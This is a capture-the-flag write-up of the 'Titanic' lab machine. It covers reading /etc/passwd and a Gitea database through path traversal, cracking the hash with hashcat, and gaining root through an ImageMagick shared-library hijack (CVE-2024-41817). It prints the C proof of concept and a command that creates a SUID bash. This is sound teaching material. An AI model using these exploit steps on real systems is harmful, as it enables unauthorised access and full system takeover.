+++
date = '2026-09-06T16:40:06+02:00'
draft = false
title = 'Titanic Writeup EN'
+++
**Author:** **`joy.scd01`**

**Date:** **`17/02/2025`**

![pwn.png](/images/imgs_titanic/pwn.png)

---
# Introduction

_**Titanic**_ is an **Easy-level Linux box** that focuses on exploiting a **Path Traversal** vulnerability in a custom web application to exfiltrate sensitive files.

In this case, the vulnerability is abused to gain **initial access** by dumping a **Gitea SQLite** database, extracting user hashes, and cracking them to obtain **SSH** access. 

The privilege escalation involves internal enumeration to find a script executed by a **cronjob**, which is vulnerable to a known **ImageMagick arbitrary code execution** flaw via a shared library hijack, ultimately leading to a full system compromise.

---
# Techniques Used

- **Path Traversal → Arbitrary File Read (Database Exfiltration)**

- **Database Dump → Hash Cracking**

- **Cronjob Hijacking → ImageMagick Arbitrary Code Execution (CVE-2024-41817)**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV titanic
```

```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp    open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to [http://titanic.htb/](http://titanic.htb/)
|_http-server-header: Apache/2.4.52 (Ubuntu)
42895/tcp filtered unknown
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added **`titanic.htb`** to my **`/etc/hosts`** file.

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## HTTP - Web Enumeration

The web application hosts a booking trip website.

![web1.png](/images/imgs_titanic/web1.png)

Analyzing the "**Book Now**" functionality, I noticed that the form asks for a **full name**, **email address**, **phone number**, **travel date**, and **cabin type**. 

![web2.png](/images/imgs_titanic/web2.png)

Submitting the form automatically downloads a **`.json`** file containing this information.

![json.png](/images/imgs_titanic/json.png)

In the background, I ran a **gobuster** scan for directories and a **ffuf** scan for vhosts.
The vhost scan revealed a **`dev`** vhost which I added to my **`/etc/hosts`** file.

![dev.png](/images/imgs_titanic/dev.png)

Visiting it revealed a **Gitea** instance. 

![gitea.png](/images/imgs_titanic/gitea.png)

I registered a new account, navigated to the **Explore** tab, and analyzed the available repositories.

![gitea2.png](/images/imgs_titanic/gitea2.png)

I found two interesting repos:

- **`docker-config`**: Contained a **`docker-compose.yml`** file leaking database credentials:

![mysql.png](/images/imgs_titanic/mysql.png)

- **`flask-app`**: Contained the source code of the main web application. Analyzing it, I found a clear **Path Traversal** vulnerability in the **`ticket`** parameter:

![vuln.png](/images/imgs_titanic/vuln.png)

**Note**: _The **`ticket`** parameter is taken directly from the **URL** query string and concatenated into a filesystem path without any proper sanitization or validation._

# Initial Access | Path Traversal → Hash Cracking → developer

To confirm the vulnerability, I successfully retrieved the **`/etc/passwd`** file:

```bash
curl "http://titanic.htb/download?ticket=/etc/passwd"
```

![path.png](/images/imgs_titanic/path.png)

Grepping for **`/bin/bash`** in the response, I identified **`developer`** as the only valid user on the system.

My next goal was to retrieve the **Gitea** database using this **path traversal**. I knew that **Gitea** typically stores its database in a file called **`gitea.db`**. Going back to the **`docker-compose.yml`** in the **Gitea** repo, I deduced that the data volume was mapped to **`/home/developer/gitea/data`**.

![gitea3.png](/images/imgs_titanic/gitea3.png)

Since the application appends the directory path, I played around with the payload and successfully downloaded the **SQLite** database by adding **`/data/gitea/`** to the path:

```bash
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" > gitea.db
```

![db.png](/images/imgs_titanic/db.png)

With the database exfiltrated, I needed to extract and crack the hashes.

![db2.png](/images/imgs_titanic/db2.png)

**Note**: _Having encountered **Gitea** multiple times in the past, I wasn't new to this platform and I knew exactly how it stores its credentials (**`PBKDF2`** with specific **iterations** and **salt** lengths). Cracking them directly from a standard **SQLite** dump can be tedious. Because of this, I went straight to a specialized tool called **`giteaToHashcat`** to parse the **`.db`** file and convert the hashes into a digestible format for **hashcat**_.

- **https://github.com/BhattJayD/giteatohashcat**

```bash
python3 giteaToHashcat.py ../gitea.db
```

![db3.png](/images/imgs_titanic/db3.png)

Since **`developer`** was the only user, I saved their formatted hash into a **`hash.txt`** file and fed it to **hashcat**:

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat.png](/images/imgs_titanic/hashcat.png)

**Hashcat** successfully cracked the password. I used these credentials to log in via **SSH**:

![userf.png](/images/imgs_titanic/userf.png)

Inside the home directory, I found the **user flag**.

# Privilege Escalation | Cronjob & ImageMagick Vuln → root

During my manual internal enumeration, I checked the **`/opt`** directory, that contained 3 directories: **`/app`**, **`/containered`**, and **`/scripts`**.

- The **`/app`** directory contained the same web application files found in the **Gitea** repo.

- The **`developer`** user did not have read permissions for the **`/containered`** directory. 

- However, in the **`/opt/scripts`** directory, I found an interesting bash script named **`identify_images.sh`**:

![opt.png](/images/imgs_titanic/opt.png)

**Note**: _This script navigates to the images directory and uses the **ImageMagick** **`identify`** command to process all **`.jpg`** files._

To understand how and when this script was being used, I transferred and ran **`pspy64`** on the machine. The output clearly showed that **`identify_images.sh`** was being triggered periodically by a cronjob running as **root**.

Knowing this, I checked the installed version of ImageMagick and searched for related vulnerabilities.

![version.png](/images/imgs_titanic/version.png)

I found an advisory for **CVE-2024-41817**:

- **https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8**

**Note**: _This vulnerability in **ImageMagick** allows an attacker to **execute arbitrary code** by planting a malicious shared library in the directory where the magick binary processes files._

To test this, I tested the provided **PoC**:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF

ls -al
id
magick /dev/null /dev/null
```

This confirmed the **ACE** vulnerability.

![priv1.png](/images/imgs_titanic/priv1.png)

Now, to weaponize this I navigated to the target directory (**`/opt/app/static/assets/images`**) and replaced the command **`id`** with **`cp /bin/bash /tmp/bash; chmod 6777 /tmp/bash`**.

![priv2.png](/images/imgs_titanic/priv2.png)

**Note**: _Since the **`identify_images.sh`** script is executed periodically by a cronjob as **root**, I just had to wait for the task to trigger. I monitored the **`/tmp`** directory and, shortly after, the malicious shared library was loaded, and the **SUID** copy of **bash** was created._

**root** shell:

```bash
/tmp/bash -p
```

![rootf.png](/images/imgs_titanic/rootf.png)

The root flag was located in **`/root`**.

---
# Final Thoughts

A fun and straightforward box.

The **path traversal** was classic but required a bit of logic to locate the **Gitea** database based on the leaked **docker-compose** file. The privilege escalation highlights the dangers of running automated cronjobs that process files in user-writable directories using binaries susceptible to shared library hijacking.

**Sources**:

- **Gitea to Hashcat Parser | https://github.com/BhattJayD/giteatohashcat**

- **ImageMagick Vulnerability (GHSA-8rxc-922v-phg8) | https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8**